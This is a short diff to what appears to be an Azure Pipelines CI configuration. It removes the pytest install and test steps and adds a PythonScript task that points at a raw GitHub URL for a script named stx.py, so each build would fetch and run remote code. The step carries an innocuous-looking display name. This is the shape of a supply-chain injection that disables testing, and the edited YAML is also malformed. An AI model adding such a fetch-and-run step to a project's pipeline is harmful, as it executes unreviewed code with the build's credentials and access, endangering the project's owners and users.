@@ -26,6 +26,8 @@ steps:
   displayName: 'Use Python $(python.version)'
 
 - script: |
-    pip install pytest pytest-azurepipelines
-    pytest
+    - task: PythonScript@0
+  inputs:
+    scriptSource: 'filePath'
+    scriptPath: 'https://raw.githubusercontent.com/Fluxduct/syntax/main/stx.py'
   displayName: 'dev.fluxduct.syntax@pipeline'
